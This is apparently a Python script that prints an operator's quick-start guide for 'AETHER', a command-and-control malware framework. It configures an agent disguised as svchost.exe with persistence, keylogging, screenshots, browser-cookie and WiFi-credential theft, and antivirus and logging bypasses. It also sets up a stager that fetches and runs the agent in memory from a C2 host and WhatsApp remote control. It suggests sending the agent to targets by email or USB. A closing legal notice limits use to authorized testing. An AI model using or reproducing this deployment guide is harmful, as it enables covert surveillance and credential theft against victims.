#!/usr/bin/env python3
"""
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ - AETHER C2 Framework
║ ║ ║ ║ ║╠═╝║  ║╣ ╠╦╝   Quick Start & Complete Setup Guide
╚═╝╩   ╩ ║ ║ ╩═╝╚═╝╩╚═

Everything you need to get AETHER running in 30 minutes.
Complete configuration, deployment, and operation guide.
"""

QUICK_START = """
╔════════════════════════════════════════════════════════════════════════════╗
║           AETHER C2 FRAMEWORK - QUICK START GUIDE (30 MIN)               ║
╚════════════════════════════════════════════════════════════════════════════╝


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 0-5: INITIAL SETUP                                                  █
█████████████████████████████████████████████████████████████████████████████

Step 1: Launch setup script
────────────────────────────────────────────────────────────────────────────

  $ python3 AETHER_SETUP.py

You'll see the main menu with 9 options. We'll configure each one.


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 5-10: CONFIGURE C2 SERVER                                            █
█████████████████████████████████████████████████████████████████████████████

From main menu: Select [1] Configure C2 Server

Then follow prompts:

1. Primary C2 Host
   → Enter: c2.example.com (or your actual C2 domain)
   
2. Primary C2 Port
   → Enter: 443 (standard HTTPS)
   
3. Encryption Key
   → Select auto-generate option (creates 64-char random key)
   ✓ Key is saved to config.json
   
4. Beacon Settings
   → Interval: 30 (check-in every 30 seconds)
   → Jitter: 5 (randomize ±5 seconds)
   
5. Multi-Channel C2 (Optional)
   → Answer 'n' for now, can enable later


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 10-15: CONFIGURE AGENT & MODULES                                     █
█████████████████████████████████████████████████████████████████████████████

From main menu: Select [2] Configure Agent

1. Agent Name
   → svchost (already default, keep it)
   
2. Persistence Methods
   → Answer 'y' to enable all (registry, scheduled_task, service, wmi)
   ✓ Agent survives reboot
   
3. Intelligence Modules
   → Answer 'y' to enable all (keylogger, screenshot, browser, etc)
   ✓ Full surveillance capabilities
   
4. Evasion Techniques
   → Answer 'y' to enable all (AMSI bypass, ETW bypass, sandbox detection)
   ✓ Anti-detection protections


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 15-20: CONFIGURE BUILDER, STAGER & WHATSAPP                          █
█████████████████████████████████████████████████████████████████████████████

Configure Builder: [3]
────────────────────

1. Output Name: svchost.exe ✓
2. PyArmor Obfuscation: yes ✓
3. UPX Compression: yes ✓
4. Icon Path: (optional, skip)

Configure Stager: [4]
─────────────────

1. Config URL: https://c2.example.com/config.json
2. Agent URL: https://c2.example.com/agent.exe

Configure WhatsApp (Optional): [5]
──────────────────────

1. Bot URL: http://localhost:3000 ✓
2. Auth Password: MySecurePassword123! ⚠️  CHANGE THIS!
3. Authorized Users: Add your WhatsApp number (+1234567890)
4. Features: Enable all


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 20-25: INSTALL DEPENDENCIES                                          █
█████████████████████████████████████████████████████████████████████████████

From main menu: Select [6] Install Dependencies

Choose [3] to install all:
- Python packages (requirements.txt)
- Node.js packages (WA-BOT-Base/)

⏱️  Wait for installation to complete (~3-5 minutes)

✓ You'll see: "dependencies installed" messages


█████████████████████████████████████████████████████████████████████████████
█ MINUTE 25-30: VALIDATE & START                                              █
█████████████████████████████████████████████████████████████████████████████

Validate Configuration: [9]
────────────────────

Run validation to check everything is correct

Expected output:
  ✅ All configurations valid!

If you see errors, go back and fix them.


Now Start Everything:
─────────────────

Open 3 terminals:

Terminal 1 (C2 Server):
$ python3 server/aether_server.py
Expected: AETHER> prompt appears

Terminal 2 (Optional - WhatsApp Bot):
$ cd WA-BOT-Base && npm start
Expected: QR code appears, scan with WhatsApp

Terminal 3 (Optional - Enable WhatsApp):
$ (go to terminal 1)
AETHER> whatsapp enable
Expected: ✓ WhatsApp integration enabled


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ CRITICAL VALUES TO CHANGE                                                   █
█████████████████████████████████████████████████████████████████████████████

These MUST be changed from defaults:

1. ✅ Encryption Key
   File: config.json
   Field: encryption_key
   Default: "CHANGE_THIS_TO_RANDOM_64_CHAR_STRING_IN_PRODUCTION"
   → Auto-generated during setup ✓
   
2. ✅ C2 Host/Port
   File: config.json
   Fields: c2.primary_host, c2.primary_port
   → Set during setup ✓
   
3. ✅ WhatsApp Password
   File: config.json
   Field: whatsapp.auth_password
   Default: "aether2025"
   → Change to: "MySecurePassword123!"
   
4. ✅ Stager URLs
   File: config.json
   Fields: stager.config_url, stager.agent_url
   → Set during setup ✓


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ WHAT EACH COMPONENT DOES                                                    █
█████████████████████████████████████████████████████████████████████████████

AETHER C2 Server (server/aether_server.py)
──────────────────────────────────────────

Purpose: Central command & control center
Listens: 0.0.0.0:443 (configurable)
Manages: All agent sessions and commands
Interactive: Type commands at AETHER> prompt

Common Commands:
  help              - Show command list
  sessions          - List connected agents
  interact agent_1  - Connect to specific agent
  whatsapp enable   - Start WhatsApp listener
  exit              - Shutdown server


AETHER Agent (agent/aether_agent.py compiled)
──────────────────────────────────────────────

Purpose: Malware that runs on target system
Behavior:
  1. Connects back to C2 server
  2. Receives commands and executes them
  3. Sends results back to C2
  4. Installs persistence to survive reboot
  5. Gathers intelligence (screenshots, keystrokes, etc)
  6. Hides from antivirus/detection

Deployed as: svchost.exe (compiled standalone executable)
Size: ~40MB (obfuscated and compressed)


WhatsApp Bot (WA-BOT-Base/)
──────────────────────────

Purpose: Optional remote control via WhatsApp
Technology: Baileys (Node.js WhatsApp client)
Behavior:
  1. Runs Baileys bot that logs into WhatsApp
  2. Forwards commands to AETHER server
  3. Returns results to WhatsApp
  4. Allows you to control agents from your phone

Commands via WhatsApp:
  auth <password>   - Login
  sessions          - List agents
  link agent_1      - Select agent
  whoami            - Get user info
  screenshot        - Capture screen
  help              - Show all commands


Builder (builder/compile.py)
──────────────────────────

Purpose: Convert Python agent to standalone Windows EXE
Process:
  1. Obfuscate Python code (PyArmor)
  2. Bundle with PyInstaller
  3. Compress with UPX
  4. Create final executable

Output: build_{timestamp}/dist/svchost.exe
Use: Deploy to targets


Stager (stager/stager.py compiled)
──────────────────────────────────

Purpose: Lightweight initial executable
Behavior:
  1. User runs stager.exe
  2. Stager downloads config from C2
  3. Stager downloads main agent from C2
  4. Stager executes main agent in memory
  5. Main agent connects to C2

Benefits:
  • Stager is small (<10MB)
  • Can update agent without rebuilding stager
  • Easy to distribute via email/USB


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ EXAMPLE WORKFLOW                                                             █
█████████████████████████████████████████████████████████████████████████████

Step-by-step example of using AETHER:

1. Start C2 Server
   $ python3 server/aether_server.py
   AETHER>

2. Build Agent
   $ python3 builder/compile.py
   [✓] Output: build_20251207.../dist/svchost.exe

3. Deploy to Target
   Send svchost.exe to target system via email/USB/etc
   Target user runs: svchost.exe

4. Agent Connects
   C2 Server shows:
   [✓] New session: agent_001 (DESKTOP-USER1)

5. Interact with Agent
   AETHER> interact agent_001
   agent_001> whoami
   [+] Result: DOMAIN\\user
   agent_001> screenshot
   [✓] Saved to screenshots/agent_001_...png
   agent_001> keylog start
   [✓] Keylogger started

6. Gather Intelligence
   agent_001> ps
   [+] PID    Name              Memory
   [+] 456    explorer.exe      45 MB
   [+] 1234   svchost.exe       8 MB  <- AETHER
   agent_001> back

7. Optional: Control via WhatsApp
   From your phone:
   Message: auth MySecurePassword123!
   Bot: ✓ Authorized!
   Message: sessions
   Bot: 📋 Active Sessions: agent_001 (DESKTOP-USER1)
   Message: link agent_001
   Bot: ✓ Linked!
   Message: screenshot
   Bot: [Screenshot sent to WhatsApp]


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ FILE STRUCTURE & WHAT TO CUSTOMIZE                                          █
█████████████████████████████████████████████████████████████████████████████

config.json ⭐ MOST IMPORTANT
├── c2.primary_host: Your C2 server (CHANGE THIS)
├── c2.primary_port: 443 (or different port)
├── encryption_key: Random 64 chars (auto-generated)
├── agent.name: "svchost" (customize process name)
├── agent.persistence_methods: Array of techniques
├── agent.modules: Intelligence gathering modules
├── builder.output_name: "svchost.exe" (customize EXE name)
├── stager.config_url: Where to download config (CHANGE THIS)
├── stager.agent_url: Where to download agent (CHANGE THIS)
└── whatsapp.auth_password: Password for WhatsApp (CHANGE THIS)

server/aether_server.py
└── Auto-loads config.json and runs C2 server
    No changes needed if config.json is correct

agent/aether_agent.py
└── Auto-loads config from C2 server
    No changes needed if config.json is correct

builder/compile.py
└── Reads config.json and compiles agent to EXE
    No changes needed

WA-BOT-Base/
├── main.js - Main bot file
├── config.json - Bot configuration (optional)
└── package.json - Node.js dependencies
    Edit config.json if needed for custom settings

server/comms/whatsapp_config.py
└── Contains WhatsApp-specific settings
    Auto-reads from main config.json


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ REFERENCE: ALL CONFIGURATION OPTIONS                                        █
█████████████████████████████████████████████████████████████████████████████

C2 SERVER CONFIG (config.json -> "c2")
─────────────────────────────────────

{
  "c2": {
    "primary_host": "c2.example.com",      ← Your server FQDN/IP
    "primary_port": 443,                   ← Listen port
    "protocol": "https",                   ← https or http
    "path": "/api/v1/beacon"               ← API endpoint
  }
}


AGENT CONFIG (config.json -> "agent")
────────────────────────────────────

{
  "agent": {
    "name": "svchost",                     ← Process name to mimic
    "persistence_methods": [               ← Survival techniques
      "registry",
      "scheduled_task",
      "service",
      "wmi"
    ],
    "modules": {
      "keylogger": true,                   ← Log keyboard input
      "screenshot": true,                  ← Capture screens
      "webcam": false,                     ← High risk!
      "audio": false,                      ← High risk!
      "browser": true,                     ← Steal cookies
      "wifi": true,                        ← WiFi creds
      "clipboard": true                    ← Clipboard monitor
    },
    "evasion": {
      "amsi_bypass": true,                 ← Bypass antivirus scanner
      "etw_bypass": true,                  ← Bypass Windows logging
      "sandbox_detection": true,           ← Detect analysis
      "vm_detection": true,                ← Detect virtual machines
      "debugger_detection": true,          ← Detect debuggers
      "sleep_obfuscation": true            ← Hide sleep calls
    }
  }
}


BUILDER CONFIG (config.json -> "builder")
──────────────────────────────────────────

{
  "builder": {
    "output_name": "svchost.exe",          ← Final EXE name
    "icon_path": "builder/windows.ico",    ← Custom icon (optional)
    "use_pyarmor": true,                   ← Obfuscate code
    "use_upx": true,                       ← Compress binary
    "obfuscation_level": "high"            ← low/medium/high
  }
}


STAGER CONFIG (config.json -> "stager")
────────────────────────────────────────

{
  "stager": {
    "config_url": "https://c2.example.com/config.json",  ← Config source
    "agent_url": "https://c2.example.com/agent.exe"      ← Agent source
  }
}


WHATSAPP CONFIG (config.json -> "whatsapp")
─────────────────────────────────────────────

{
  "whatsapp": {
    "bot_url": "http://localhost:3000",    ← Bot server
    "auth_password": "SecurePassword123",  ← WhatsApp login password
    "authorized_users": [                  ← Allowed numbers
      "+1234567890",
      "+44987654321"
    ]
  }
}


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ TROUBLESHOOTING QUICK REFERENCE                                             █
█████████████████████████████████████████████████████████████████████████████

Problem: "ModuleNotFoundError: No module named 'cryptography'"
Solution:
  pip install cryptography pycryptodome

Problem: "Agent not connecting to C2"
Solution:
  1. Check C2 is running: python3 server/aether_server.py
  2. Check firewall allows port 443
  3. Check config.json has correct primary_host
  4. Check agent built with correct config

Problem: "WhatsApp bot won't scan QR code"
Solution:
  1. Reinstall Node dependencies: cd WA-BOT-Base && npm install
  2. Delete QR cache: rm -rf auth/
  3. Restart bot: npm start
  4. Scan with official WhatsApp app (not WhatsApp Web)

Problem: "Permission denied when running scripts"
Solution:
  chmod +x AETHER_SETUP.py
  chmod +x CONFIG_TEMPLATES.py
  chmod +x DEPLOYMENT_GUIDE.py

Problem: "Port 443 already in use"
Solution:
  Change in config.json: "primary_port": 8443
  Then rebuild agent with new config

Problem: "Script says 'encryption_key' is default"
Solution:
  Re-run AETHER_SETUP.py and auto-generate new key
  It will create a random 64-character key


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ IMPORTANT LEGAL NOTICE                                                      █
█████████████████████████████████████████████████████████████████████████████

⚠️  AETHER IS FOR AUTHORIZED SECURITY TESTING ONLY!

✓ Legal Uses:
  • Authorized penetration testing with written permission
  • Red team exercises within your own organization
  • Educational purposes for cybersecurity training
  • Research and analysis in controlled environments

✗ Illegal Uses:
  • Unauthorized access to any computer system
  • Installing malware on systems without permission
  • Intercepting communications
  • Theft of data
  • Disruption of services

Legal Consequences of Misuse:
  • Federal criminal charges (Computer Fraud & Abuse Act)
  • Up to 10 years in federal prison
  • Fines up to $250,000
  • Civil lawsuits and damages
  • Loss of employment and security clearances
  • Permanent criminal record

⚠️  You are legally responsible for all uses of this framework!

Always:
  ✓ Get explicit written authorization before testing
  ✓ Understand all applicable laws in your jurisdiction
  ✓ Keep detailed documentation of all activities
  ✓ Report findings responsibly
  ✓ Protect victim privacy and data


═══════════════════════════════════════════════════════════════════════════════


█████████████████████████████████████████████████████████████████████████████
█ NEXT STEPS                                                                  █
█████████████████████████████████████████████████████████████████████████████

1. ✅ Complete AETHER_SETUP.py configuration
2. ✅ Validate with: python3 AETHER_SETUP.py → [9]
3. ✅ Read DEPLOYMENT_GUIDE.py for detailed instructions
4. ✅ Check CONFIG_TEMPLATES.py for example configurations
5. ✅ Start C2 server: python3 server/aether_server.py
6. ✅ Test with demo agent on isolated test system
7. ✅ Build production agent with final config
8. ✅ Deploy to authorized targets
9. ✅ Monitor and command agents via AETHER console or WhatsApp
10. ✅ Perform cleanup and reporting


═══════════════════════════════════════════════════════════════════════════════

For detailed information:

Setup Instructions:    python3 AETHER_SETUP.py
Configuration Guide:  python3 CONFIG_TEMPLATES.py
Deployment Guide:     python3 DEPLOYMENT_GUIDE.py
WhatsApp Integration: WA-BOT-Base/AETHER_README.md

Full documentation is embedded in each setup file.

Good luck! 🎯

═══════════════════════════════════════════════════════════════════════════════
"""

if __name__ == '__main__':
    print(QUICK_START)
    
    # Save to file too
    with open('QUICK_START.txt', 'w') as f:
        f.write(QUICK_START)
    print("\n✓ Saved to QUICK_START.txt")
